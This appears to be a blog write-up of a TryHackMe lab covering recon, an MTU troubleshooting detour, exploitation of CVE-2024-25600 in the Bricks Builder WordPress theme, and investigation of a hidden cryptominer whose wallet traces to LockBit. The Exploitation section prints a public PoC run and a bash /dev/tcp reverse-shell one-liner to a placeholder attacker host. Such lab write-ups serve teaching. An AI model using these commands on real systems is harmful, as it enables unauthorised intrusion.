---
layout: post
mermaid: true
title: "Bricks Heist"
date: 2026-10-29
categories: [ctf, web, wordpress]
tags: [cve-2024-25600, bricks-builder, wordpress, cryptominer, blockchain-osint, pmtu-blackhole]
---

## Overview

| | |
|---|---|
| **Platform** | TryHackMe |
| **Difficulty** | Easy |
| **URL** | <a href="https://tryhackme.com/room/tryhack3mbricksheist" target="_blank">https://tryhackme.com/room/tryhack3mbricksheist</a> |
| **Focus** | Unauthenticated RCE in a WordPress theme, then investigating the cryptominer it drops and tracing its wallet with blockchain OSINT |

Bricks Heist is a short room with a long tail: a single CVE gets you a shell, but the interesting half is what you find afterwards — a fake "network" service quietly mining crypto, and a wallet you can follow all the way to a sanctioned ransomware operation. It also handed me the most stubborn network problem I have hit in an Easy room, so I will be honest about that detour too.

---

## Reconnaissance

I started with a full port scan and then a service scan on what came back:

```bash
nmap -Pn -p- --min-rate 2000 bricks.thm
nmap -Pn -sV -sC -p 22,80,443,3306 bricks.thm

PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.11
80/tcp   open  http     Python (WebSockify)
443/tcp  open  ssl/http Apache  (WordPress 6.5, "Brick by Brick")
3306/tcp open  mysql    MySQL
```

Port 80 is WebSockify (a WebSocket-to-TCP proxy, the kind noVNC uses) and just answers `405` to a normal GET — a decoy, not a web app. The real target is **443**: Apache serving WordPress 6.5 behind a self-signed, expired certificate. SSH and MySQL I parked as secondary.

---

## The Connectivity Wall

Before any of that worked reliably, I spent a while fighting the network, so it is worth documenting. Small requests were fine, but anything that returned a **large** response — the TLS handshake, the WordPress home page, `wpscan` output — just hung. `curl` sat there and eventually returned nothing:

```bash
curl -k -s -o /dev/null -w "code=%{http_code} bytes=%{size_download}\n" https://bricks.thm/

code=000 bytes=0
```

It happened over the VPN and from the AttackBox alike, which ruled out my own setup being uniquely broken. The box was not overloaded either — once I was in, `uptime` showed a load average of ~0.00. The clue only turned up from inside the machine:

```bash
ip addr show
# ens5: <...> mtu 9001 ...
```

The target's interface comes up with an **MTU of 9001** — AWS jumbo frames — while the path to me tops out around 1500. Big packets the server sends simply do not fit and get dropped; small ones do, so they pass. That lines up with everything I saw, though I never packet-captured the exact hop, so I will call it the most likely explanation rather than a proven one.

What helped (none of it a clean fix): clamping the TCP MSS so the server never emits giant segments —

```bash
# in the THM .ovpn, then reconnect
mssfix 1200
```

— but even with `mssfix 1200` it only worked intermittently. The reliable move was simply to **enumerate and exploit in the first few minutes after booting the box**, before it started hanging. Other players reported the same thing in the room's Discord, so this looks like the room/image rather than any one person's config.

---

## Finding the Vector

With a working window, the theme gave itself away. Its version lives in its own stylesheet:

```bash
curl -k -s https://bricks.thm/wp-content/themes/bricks/style.css | grep -i version

Version: 1.9.5
```

**Bricks Builder 1.9.5** — within the vulnerable range (≤ 1.9.6) for **CVE-2024-25600**, an unauthenticated RCE. The room name ("Bricks Heist") was not subtle, and this confirmed it.

---

## Exploitation

CVE-2024-25600 abuses a `nonce` that the Bricks theme leaks in public page HTML. With that nonce, a request to `/wp-json/bricks/v1/render_element` reaches a server-side `eval()`, so you get command execution without authenticating. I used the public PoC (Exploit-DB 52619):

```bash
python3 52619.py -u https://bricks.thm/

[+] The target is vulnerable
[+] Interactive shell opened successfully
Shell> id
uid=1001(apache) gid=1001(apache) groups=1001(apache)
```

That `Shell>` prompt is not a real shell — each line is run through PHP's `eval()`, one process at a time — so I jumped to a proper reverse shell. The RCE runs via `/bin/sh` (dash), which does not understand `/dev/tcp`, so I wrapped the payload in `bash -c`:

```bash
nc -lvnp <ATTACKER_PORT>                                            # listener

bash -c 'bash -i >& /dev/tcp/<ATTACKER_IP>/<ATTACKER_PORT> 0>&1'    # on the target
```

Then the usual TTY upgrade:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

The PoC window throws a Python traceback when the shell takes over the connection — that is expected, the listener already has the session.

---

## The Hidden Miner

As `apache`, I looked for anything running that should not be:

```bash
systemctl | grep running

ubuntu.service   loaded active running   TRYHACK3M
```

A service literally described `TRYHACK3M` is a strong hint. Its details point at a binary pretending to be part of NetworkManager:

```bash
systemctl status ubuntu.service --no-pager

Main PID: 2897 (nm-inet-dialog)
CGroup:   /lib/NetworkManager/nm-inet-dialog
```

In `/lib/NetworkManager` sat the binary and, next to it, a world-readable log:

```bash
cd /lib/NetworkManager && ls -l

-rw-r--r-- 1 root root   66376  inet.conf          # miner log, world-readable
-rwxr-xr-x 1 root root 6948448  nm-inet-dialog      # the binary (PyInstaller ELF)
```

`nm-inet-dialog` is a cryptominer, and `inet.conf` is its log.

---

## Recovering the Wallet

The first line of `inet.conf` is an `ID:` in hex, next to log lines like `Bitcoin Miner Thread Started`. It is the wallet, encoded. One gotcha first: `grep 'ID' inet.conf` just says `Binary file matches`, because the file mixes text with non-UTF8 bytes and grep won't print matches from a "binary" file by default — `grep -a` forces it to treat the file as text.

The encoding is three layers — hex, then base64 twice — so I reversed them in that order:

```bash
grep -a -oP 'ID:\s*\K\S+' inet.conf | head -n1 | xxd -r -p | base64 -d | base64 -d | cut -c1-42

bc1qyk79fcp9hd5krepr[...]
```

(If you prefer not to touch `apache`'s log, you can exfiltrate the PyInstaller binary, unpack it with `pyinstxtractor`, decompile the entry point, and rebuild the address from its source — the miner concatenates three fragments and applies ROT13. Both routes land on the same Bitcoin address.)

---

## Following the Money

A single `bc1q...` address is just a string until you look it up. Dropping it into a blockchain explorer and walking its transactions, one of the counterpart addresses shows up in a **US Treasury OFAC advisory** — and that advisory ties it to the **LockBit** ransomware group. That is the room's punchline: the miner's payouts trace to a sanctioned operation, so the "threat group" behind the wallet is LockBit.

---

## Attack Flow

<div class="mermaid">
graph TD
 subgraph RECON["RECON"]
  A["nmap<br/>443 Apache WordPress 6.5"]
 end
 
 subgraph ENUM["ENUMERATION"]
  B["style.css<br/>Bricks Builder 1.9.5"] --> C["CVE-2024-25600<br/>unauthenticated RCE"]
 end
 
 subgraph EXPL["EXPLOITATION"]
  D["PoC 52619.py<br/>RCE as apache"] --> E["Reverse shell<br/>bash -c plus pty"]
 end
 
 subgraph POST["POST-EXPLOITATION"]
  F["systemctl<br/>ubuntu.service - nm-inet-dialog"] --> G["inet.conf log<br/>hex plus base64 base64"]
  G --> H["Bitcoin wallet<br/>blockchain OSINT"]
  H --> I["OFAC advisory<br/>threat group LockBit"]
 end
 
 A --> B
 C --> D
 E --> F
</div>

---

## Key Takeaways

**The CVE is the easy half.** Getting a shell took one public PoC; the room's real content was post-exploitation — identifying a disguised service and decoding what it left behind. Easy boxes can still teach investigation, not just exploitation.

**Small works, large hangs = think MTU.** When tiny requests succeed but every large response stalls, over VPN and on a local network alike, suspect a path-MTU black hole before blaming the target being "down". `mssfix` on the VPN is the usual lever.

**Layered encoding is just layers.** Hex wrapping two rounds of base64 looks intimidating in a log, but you peel it in reverse order one step at a time — and a tool like CyberChef's "Magic" spots the chain for you.

**Addresses are attribution.** A cryptocurrency wallet is a public identifier; walking its transactions and cross-referencing sanctions lists turned a random string into a named threat actor.

No flags are discussed here.
